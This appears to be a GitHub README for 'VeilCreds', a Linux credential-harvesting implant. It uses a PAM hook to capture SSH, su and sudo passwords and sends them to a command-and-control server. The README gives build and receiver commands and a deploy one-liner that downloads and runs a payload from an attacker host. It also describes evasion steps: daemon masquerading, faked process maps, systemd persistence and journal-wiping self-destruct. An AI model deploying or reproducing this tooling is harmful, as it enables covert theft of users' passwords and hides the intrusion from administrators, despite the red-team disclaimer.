# VeilCreds, a hidden PAM credential harvester

Post-exploitation credential harvester for Linux. Intercepts SSH/SU/SUDO passwords via a PAM module and exfiltrates encrypted logs to a C2 server. Single binary deployment
, zero dependencies on target.

> **For authorized red team operations and adversary simulation only.**

The implant masquerades as a legit process to blend with legitimate system services. All operational strings are XOR-encoded at build time across two separate key layers. 
Credentials are captured by the PAM module, encrypted, and stored locally as binary blobs disguised with a fake ELF cache header. Exfiltration happens over raw sockets, au
thenticated using a build-time token sent as an `X-Correlation-ID` header. Persistence is handled through a systemd service that mimics the real daemon. The on-disk binary
 contains decoy strings matching a real system daemon, blending with normal system binaries. At runtime, the process inflates its memory footprint and maps system shared l
ibraries into `/proc/PID/maps` to match the fingerprint of a dynamically-linked daemon. When configured, the implant performs a full 9 phase self-destruct that removes all
 traces including PAM configs, binaries, service files, and journal entries.

<p align="center">
<i>
This tool is not a rootkit, and was not designed to evade EDRs or any other endpoint defense mechanism. Its core functionality depends on modifying PAM modules, which alon
e would trigger alerts on any modern EDR. The real focus is on deceiving the sysadmin, making sure nothing looks out of place during routine inspection. Every technique im
plemented here was built around stealth, blending in with legitimate system components, and making basic forensic analysis harder.
</i>
</p>

---
## Requirements

**Target:**
- Linux with PAM support (Debian/Ubuntu/Kali/CentOS/RHEL/Fedora/Rocky/Alma)
- Root access
- x86_64 architecture
- Kernel 3.17+

**Build host:**
```bash
git clone https://github.com/lsbxa/VeilCreds.git
sudo apt install gcc make python3 libpam0g-dev
sudo apt install musl-tools
```
## Usage

**1. Compile:**
```bash
make C2_IP=<ip> C2_PORT=<port> [INTERVAL=seconds] [DESTRUCT=seconds] [ENDPOINT=uri]
```

**2. Start receiver (attacker):**
```bash
python3 receiver.py --port 443
```

**3. Deploy on target (victim):**
```bash
# example
curl -s -o /dev/shm/.upd http://attacker:8000/update && chmod +x /dev/shm/.upd && /dev/shm/.upd ; rm -f /dev/shm/.upd
```

**4. Logs arrive automatically** in `loot/` directory.

## Configurable Parameters

1. C2_IP & C2_PORT (required)

```bash
make C2_IP=192.168.1.100 C2_PORT=80
```

- IP and port of the C2 server that will receive the exfiltrated credentials
- IP Default: 127.0.0.1
- Port Default: 80
- The deployer decodes at runtime and connects via raw socket TCP

2. INTERVAL (optional)

```bash
make C2_IP=10.0.0.5 C2_PORT=80 INTERVAL=1800
```

- Base interval (in seconds) between each credential exfiltration
- Default: 3600 (1 hour)
- The value is not fixed, jittered_sleep() applies ±20% randomization. So INTERVAL=3600 results in exfiltrations every ~2880-4320 seconds

3. DESTRUCT (optional)


```bash
make C2_IP=10.0.0.5 C2_PORT=80 DESTRUCT=604800
```

- Time in seconds after which the implant self-destructs
- Default: 0 (disabled)

4. ENDPOINT (optional)

```bash
make C2_IP=10.0.0.5 C2_PORT=443 ENDPOINT=/api/v2/telemetry
```

- URI path used for C2 communication
- Default: /l
- Both the implant and the receiver must use the same endpoint
- Use URIs that blend with legitimate web traffic for better OPSEC

## Receiver (C2 server-side)

```bash
python3 receiver.py [--port PORT] [--token-file PATH] [--endpoint URI]
```
 --port        80              HTTP receiver listening port
 --token-file  auth_token.key  Auth token file (generated during build)
 --endpoint    /l              URI path (must match the build ENDPOINT)

Important: The auth_token.key generated during `make` must be accessible to the receiver. Without it, the receiver accepts uploads from any source (insecure).

Two layers of encapsulation: loader contains encrypted deployer, deployer hooks PAM via pam_exec.so at runtime.
